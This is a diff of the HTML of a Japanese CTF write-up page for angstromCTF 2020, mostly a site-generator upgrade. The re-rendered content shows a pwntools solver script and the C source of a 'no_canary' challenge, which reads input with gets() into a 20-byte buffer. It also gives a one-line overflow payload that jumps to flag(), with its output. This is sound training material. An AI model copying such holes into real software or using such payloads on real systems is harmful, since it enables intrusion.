@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="ångstromCTF 2020 Writeup" />
 <meta property="og:description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2020/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2020-03-19T10:00:00+09:00" />
 <meta property="article:modified_time" content="2020-03-20T09:00:00+09:00" />
 <meta itemprop="name" content="ångstromCTF 2020 Writeup">
-<meta itemprop="description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな">
-<meta itemprop="datePublished" content="2020-03-19T10:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2020-03-20T09:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="3294">
-
-
-
+<meta itemprop="description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな"><meta itemprop="datePublished" content="2020-03-19T10:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-03-20T09:00:00+09:00" />
+<meta itemprop="wordCount" content="3345">
 <meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ångstromCTF 2020 Writeup"/>
 <meta name="twitter:description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな"/>
@@ -181,19 +177,16 @@
     <li><a href="#misc-psk-90-points">[Misc]: PSK (90 points)</a>
       <ul>
         <li><a href="#challenge-5">Challenge</a></li>
-        <li><a href="#unsolved">(Unsolved)</a></li>
       </ul>
     </li>
     <li><a href="#misc-inputter-100-points">[Misc]: Inputter (100 points)</a>
       <ul>
         <li><a href="#challenge-6">Challenge</a></li>
-        <li><a href="#unsolved-1">(Unsolved)</a></li>
       </ul>
     </li>
     <li><a href="#misc-all-these-rules--points">[Misc]: All These Rules (?? points)</a>
       <ul>
         <li><a href="#challenge-7">Challenge</a></li>
-        <li><a href="#unsolved-2">(Unsolved)</a></li>
       </ul>
     </li>
     <li><a href="#misc-ws3-180-points">[Misc]: WS3 (180 points)</a>
@@ -237,7 +230,7 @@ It&rsquo;ll be no problem for you, of course!
 <br /><br />
 nc misc.2020.chall.actf.co 20300</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>アクセスすると、以下のような出力が得られます。</p>
 <pre>
@@ -257,7 +250,7 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 <p>以下が書いたコードです。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -297,54 +290,52 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 </span><span class="lnt">38
 </span><span class="lnt">39
 </span><span class="lnt">40
-</span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding:utf-8 -*-</span>
-
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
-
-<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;misc.2020.chall.actf.co&#39;</span><span class="p">,</span> <span class="mi">20300</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">fib</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
-    <span class="n">L</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
-        <span class="n">L</span> <span class="o">+=</span> <span class="p">[</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="p">]</span>
-    <span class="k">return</span> <span class="n">L</span><span class="p">[</span><span class="n">a</span><span class="p">]</span>
-
-<span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-        <span class="k">if</span> <span class="mh">0x41</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x5a</span><span class="p">:</span>
-            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x41</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x41</span>
-        <span class="k">elif</span> <span class="mh">0x61</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7a</span><span class="p">:</span>
-            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x61</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span>
-    <span class="k">return</span> <span class="n">s</span>
-
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-    <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-    <span class="c1"># Example:</span>
-    <span class="c1"># Shift LFDTGUKDZBKGHWMEHRAAUQEYGXIHRTLFMXRCKURN by n=49</span>
-    <span class="k">if</span> <span class="s2">&#34;Shift&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
-        <span class="n">dat</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Shift (.*) by.*&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;.*n=(.*)&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
-        <span class="n">dat2</span> <span class="o">=</span> <span class="n">rot</span><span class="p">(</span><span class="n">dat</span><span class="p">,</span> <span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dat2</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="s2">&#34;actf{&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="k">break</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;misc.2020.chall.actf.co&#39;</span><span class="p">,</span> <span class="mi">20300</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fib</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">L</span> <span class="o">+=</span> <span class="p">[</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">L</span><span class="p">[</span><span class="n">a</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="mh">0x41</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x5a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x41</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x41</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="mh">0x61</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x61</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Example:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Shift LFDTGUKDZBKGHWMEHRAAUQEYGXIHRTLFMXRCKURN by n=49</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Shift&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dat</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Shift (.*) by.*&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;.*n=(.*)&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dat2</span> <span class="o">=</span> <span class="n">rot</span><span class="p">(</span><span class="n">dat</span><span class="p">,</span> <span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dat2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;actf{&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>書いたと言っても、フィボナッチのコードは昔どこかのCTFでやったのが残っていたのと、rot関数はいつも使っているやつの使い回しなので、新規に書いた部分はちょっとだけです。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -361,7 +352,7 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -397,58 +388,58 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wait, what? It&#39;s already noon!&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Why didn&#39;t my canary wake me up?&#34;</span><span class="p">);</span>
-	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, sorry if I kept you waiting.&#34;</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;What&#39;s your name? &#34;</span><span class="p">);</span>
-
-	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
-	<span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
-
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wait, what? It&#39;s already noon!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Why didn&#39;t my canary wake me up?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Well, sorry if I kept you waiting.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What&#39;s your name? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <h3 id="solution-1">Solution</h3>
 <p>なんかもう、オフセットサイズとかちゃんと調べず、適当に8バイトずつ値を何回か変えて試しました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  x flag
-0x401186 &lt;flag&gt;:	0xe5894855
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  x flag
+</span></span><span class="line"><span class="cl">0x401186 &lt;flag&gt;:	0xe5894855
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -470,29 +461,29 @@ Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVR
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
-Ahhhh, what a beautiful morning on the farm!
-
-       _.-^-._    .--.
-    .-&#39;   _   &#39;-. |__|
-   /     |_|     \|  |
-  /               \  |
- /|     _____     |\ |
-  |    |==|==|    |  |
-  |    |--|--|    |  |
-  |    |==|==|    |  |
-^^^^^^^^^^^^^^^^^^^^^^^^
-
-Wait, what? It&#39;s already noon!
-Why didn&#39;t my canary wake me up?
-Well, sorry if I kept you waiting.
-What&#39;s your name? 
-Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!
-actf{that_gosh_darn_canary_got_me_pwned!}
-Segmentation fault
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
+</span></span><span class="line"><span class="cl">Ahhhh, what a beautiful morning on the farm!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       _.-^-._    .--.
+</span></span><span class="line"><span class="cl">    .-&#39;   _   &#39;-. |__|
+</span></span><span class="line"><span class="cl">   /     |_|     \|  |
+</span></span><span class="line"><span class="cl">  /               \  |
+</span></span><span class="line"><span class="cl"> /|     _____     |\ |
+</span></span><span class="line"><span class="cl">  |    |==|==|    |  |
+</span></span><span class="line"><span class="cl">  |    |--|--|    |  |
+</span></span><span class="line"><span class="cl">  |    |==|==|    |  |
+</span></span><span class="line"><span class="cl">^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Wait, what? It&#39;s already noon!
+</span></span><span class="line"><span class="cl">Why didn&#39;t my canary wake me up?
+</span></span><span class="line"><span class="cl">Well, sorry if I kept you waiting.
+</span></span><span class="line"><span class="cl">What&#39;s your name? 
+</span></span><span class="line"><span class="cl">Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!
+</span></span><span class="line"><span class="cl">actf{that_gosh_darn_canary_got_me_pwned!}
+</span></span><span class="line"><span class="cl">Segmentation fault
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
